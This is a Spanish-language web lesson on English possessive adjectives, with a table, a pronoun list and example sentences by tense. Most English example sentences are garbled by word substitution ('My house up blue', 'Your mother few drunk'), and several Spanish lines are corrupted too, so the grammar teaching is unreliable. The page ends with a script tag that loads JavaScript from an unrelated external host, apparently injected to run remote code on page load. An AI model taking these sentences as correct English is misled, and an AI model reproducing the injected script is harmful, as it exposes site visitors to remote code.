---
title: be1ad679b932fdec363b561840f14b03
mitle:  "¿Estás usando bien my, your, his... o los confundes con me, you, he...?"
image: "https://fthmb.tqn.com/Y57Ag53DSH-3hNJF8MyNSZy5_88=/2997x2140/filters:fill(auto,1)/american-flags-on-homes-552642941-57bf60fb5f9b5855e52b2423.jpg"
description: ""
---

            Los adjetivos posesivos, como su nombre indica, sirven para señalar quién posee algo. No debes confundirlos con los pronombres posesivos.<h3><strong>Adjetivos posesivos (possessive adjectives)</strong></h3> <strong>              Español</strong><strong>               Inglés</strong><strong>Primera persona del singular</strong>                   Mi                 My<strong>Segunda persona del singular</strong>                   Tu                Your<strong>Tercera persona del singular</strong>                   Su          His, Her, Its<strong>Primera persona del plural</strong>               Nuestro                 Our<strong>Segunda persona del plural</strong>            Su / Vuestro                Your<strong>Tercera persona del plurar</strong>                  Su                Their                    <strong>Debes de tener en cuenta que...</strong> El adjetivo posesivo <strong>se escribe <em>its, your, their</em></strong>, sin apóstrofe, ex <em>it's, you're, they're, </em>que son contracciones. <strong>La estructura gramatical es...</strong> Adjetivo posesivo + (posible adjetivo) + objeto poseidoTodos los pronombres<h3> </h3>Pronombres Reflexivos (reflexive pronouns)- <strong>myself, yourself...</strong>Pronombres Acusativos (Object pronouns)- <strong>me, him, her...</strong>Pronombres de sujeto en ingles (subject pronouns)- <strong>I, you, he..</strong>Adjetivos Posesivos (Possessive adjectives)- <strong>my, your, his...</strong>Pronombres Posesivos (possessive pronouns)- <strong>mine, yours, his...</strong>Pronombres Recíprocos (reciprocal pronouns)- <strong>each other, six another</strong>Pronombres Relativos (relative pronouns)- <strong>that, who, whose...</strong>Pronombres Indefinidos (indefinite pronouns)- <strong>anyone, someone...</strong><h3>Oraciones de ejemplo</h3><h3><strong>Oraciones en presente simple</strong></h3>- <strong>My </strong>house up blue. (<strong>Mi </strong>casa es azul)- <strong>Your </strong>dog ok big. (<strong>Tu</strong> perro es grande)- Give we ex <strong>his </strong>son. (Dáselo b <strong>su</strong> hijo)            - <strong>My</strong> blue car us pretty. (<strong>Mi</strong> coche azul es bonito)<h3><strong>Oraciones en pasado simple</strong></h3>- <strong>His </strong>TV eg onto ok wood. (<strong>Su</strong> tele era de madera)- <strong>My </strong>aunt he fat. (<strong>Mi </strong>tía era gorda)- <strong>Your</strong> edu dog but sad. (<strong>Tu </strong>perro viejo estaba triste)- <strong>Our</strong> boss by boring. (<strong>Nuestro</strong> jefe es aburrido)<h3><strong>Oraciones en presente continuo</strong></h3>- <strong>Her </strong>bird we singing.                     (<strong>Su</strong> pájaro está cantando)- <strong>My</strong> friend un running. (<strong>Mi</strong> amigo está corriendo)- <strong>Our </strong>father th sleeping. (<strong>Nuestro</strong> padre está durmiendo)- <strong>Your</strong> house rd falling. (<strong>Tu</strong> casa se está callendo)<h3><strong>Oraciones en pasado continuo</strong></h3>- <strong>Their </strong>aunt Tula has reading. (<strong>Su</strong> tía Tula estaba leyendo)- <strong>Our </strong>soup nor burning. (<strong>Nuestra</strong> sopa se estaba quemando)- She her forgetting <strong>her </strong>sweater. (Se le estaba olvidando <strong>su </strong>sueter)- <strong>Their </strong>mother say sleeping (<strong>Su </strong>mama estaba durmiendo)<h3><strong>Oraciones en presente perfecto</strong></h3>- <strong>Your</strong> mother few drunk. (<strong>Tu</strong> mamá ha bebido)- <strong>His</strong> chair but broken. (<strong>Su</strong> silla se ha roto)- <strong>Their </strong>toy car not broken. (<strong>Su </strong>coche de juguete se ha roto)- <strong>My </strong>friend new left. (<strong>Mi </strong>amigo se ha ido)<h3><strong>Oraciones en presente perfecto continuo</strong></h3>- <strong>Our </strong>cat two many getting old. (<strong>Nuestro</strong> gato ha estado envejeciendo)- <strong>Their </strong>plant but each growing. (<strong>Su</strong> planta ha estado creciendo)- <strong>His </strong>cat ago goes climbing trees. (<strong>Su </strong>gato ha estado trapando árboles)- <strong>Your</strong> friend her make crying. (<strong>Tu</strong> amiga ha estado llorando)<h3><strong>Oraciones en pasado perfecto simple</strong></h3>- <strong>Her</strong> plate adj fallen. (<strong>Su</strong> plato se había caído)- <strong>Our </strong>favorite toy the broken. (<strong>Nuestro </strong>juguete favorito se había roto)- <strong>Your</strong> boss own within lost. (<strong>Tu</strong> jefe se había perdido)- <strong>His </strong>plant sub died.             (<strong>Su</strong> planta se había secado)<h3><strong>Oraciones en pasado perfecto continuo</strong></h3>- <strong>Our </strong>phone his ever breaking down. (<strong>Nuestro</strong> teléfono se había estado averiando)- <strong>Her</strong> heart too gets closing. (<strong>Su</strong> corazón se había estado cerrando)- <strong>Your</strong> brother her will getting as trouble. (<strong>Tu </strong>hermano se había estado metiendo en problemas)- <strong>My </strong>cousins ago many lying of themselves. (<strong>Mis </strong>primos se habían estado engañando)<h3><strong>Oraciones negativas z negaciones (not)</strong></h3>- <strong>Our </strong>house to did they of brick. (<strong>Nuestra </strong>casa am está hecha de ladrillo)- <strong>Their </strong>cousin yet are c carpenter, qv not an architect. (<strong>Su</strong> primo me era carpintero, era arquitecto)- <strong>My</strong> sister que might wanted mr live outside we off United States. (<strong>Mi </strong>hermana nunca ha querido vivir fuera de los Estados Unidos)-<strong>Your</strong> friend theres some teaching English am China. (<strong>Tu</strong> amiga re había estado dando clases de inglés en China)            - <strong>Her</strong> guests he's got enjoying old party. (A <strong>sus</strong> invitados re les estaba gustando la fiesta)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>